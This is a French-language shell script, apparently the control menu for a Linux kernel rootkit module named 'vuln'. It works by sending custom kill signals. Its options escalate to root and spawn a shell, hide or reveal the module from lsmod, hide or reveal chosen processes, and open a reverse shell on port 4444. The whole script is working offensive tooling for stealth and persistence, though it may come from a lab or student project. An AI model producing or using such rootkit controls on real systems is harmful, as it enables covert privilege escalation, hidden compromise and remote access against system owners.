#!/usr/bin/env sh

# Définition des couleurs
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
BOLD="\e[1m"
RESET="\e[0m"

echo -e "${CYAN}${BOLD}

	 .d8888b.       8888888b.        .d8888b.  
	d88P  Y88b      888   Y88b      d88P  Y88b 
	888    888      888    888      888    888 
	888             888   d88P      Y88b. d888 
	888  88888      8888888P         Y888P888 
	888    888      888 T88b               888 
	Y88b  d88P      888  T88b       Y88b  d88P 
	 Y8888P88       888   T88b        Y8888P  
                                                                                 
${RESET}------------------------------------------------------------${RESET}"
echo ""
echo ""
while true; do
    echo -e "${GREEN}${BOLD}Menu Principal:${RESET}"
    echo -e "${YELLOW}${BOLD}"
    echo "1. Elever les privileges"
    echo "2. Lister les modules"
    echo "3. Masquer le module"
    echo "4. Reveler le module"
    echo "5. Lister les processus"
    echo "6. Cacher un processus"
    echo "7. Révéler un processus caché"
    echo "8. Ouvrir un reverse shell"
    echo "9. Quitter"
    echo -e "${RESET}Choisissez une option: "
    read choix
    echo ""

    case $choix in
        1)
            echo -e "${MAGENTA}Elevation des privileges${RESET}"
            kill -26 2600
            echo -e "${GREEN}Commande executee: kill -26 2600${RESET}"
            echo -e "${GREEN}"
            id
            echo -e "${RESET}"
            echo -e "${CYAN}Ouverture d'un nouveau shell avec privileges eleves...${RESET}"
            /bin/sh
            break
            ;;
        2)
            echo -e "${MAGENTA}Lister la liste des modules${RESET}"
            echo -e "${GREEN}Commande executee: lsmod${RESET}"
            echo -e "${GREEN}"
            lsmod
            echo -e "${RESET}"
            ;;
        3)
            echo -e "${MAGENTA}Masquer le module vuln${RESET}"
            echo -e "${GREEN}Commande executee: kill -64 0${RESET}"
            kill -64 0
            echo -e "${GREEN}"
            lsmod
            echo -e "${RESET}"
            ;;
        4)
            echo -e "${MAGENTA}Reveler le module vuln${RESET}"
            echo -e "${GREEN}Commande executee: kill -64 267${RESET}"
            kill -64 267  
            echo -e "${GREEN}"
            lsmod
            echo -e "${RESET}"
            ;;
        5)
            echo -e "${MAGENTA}Lister les processus${RESET}" 
            echo -e "${GREEN}"
            ps
            echo -e "${RESET}"
            ;;
        6)
            echo -e "${MAGENTA}Cacher un processus${RESET}"
            echo "Liste des processus en cours :"
            echo -e "${GREEN}Entrez le numéro PID du processus à cacher :${RESET}"
            read pid
            if [[ $pid =~ ^[0-9]+$ ]]; then
                echo -e "${GREEN}Commande executee: kill -42 $pid${RESET}"
                kill -42 $pid
            else
                echo -e "${RED}Erreur : Veuillez entrer un numéro PID valide.${RESET}"
            fi
            echo -e "${RESET}"
            ;;

        7)
            echo -e "${MAGENTA}Révéler un processus caché${RESET}"
            echo -e "${GREEN}Entrez le numéro PID du processus à révéler :${RESET}"
            read pid
            if [[ $pid =~ ^[0-9]+$ ]]; then
                echo -e "${GREEN}Commande executée: kill -43 $pid${RESET}"
                kill -43 $pid
            else
                echo -e "${RED}Erreur : Veuillez entrer un numéro PID valide.${RESET}"
            fi
            echo -e "${RESET}"
            ;;

        8)
            echo -e "${MAGENTA}Ouverture d'un reverse shell sur le port 4444${RESET}"
            echo -e "${GREEN}Commande executee: kill -62 2600${RESET}"
            kill -62 2600
            echo -e "${RESET}"
            ;;
        9)
            echo -e "${RED}Quitter${RESET}"
            break
            ;;
        *)
            echo -e "${RED}Option invalide${RESET}"
            ;;
    esac 
    echo ""
    echo -e "${CYAN}Appuyez sur une touche pour continuer...${RESET}"
    read -n 1
    echo ""
done
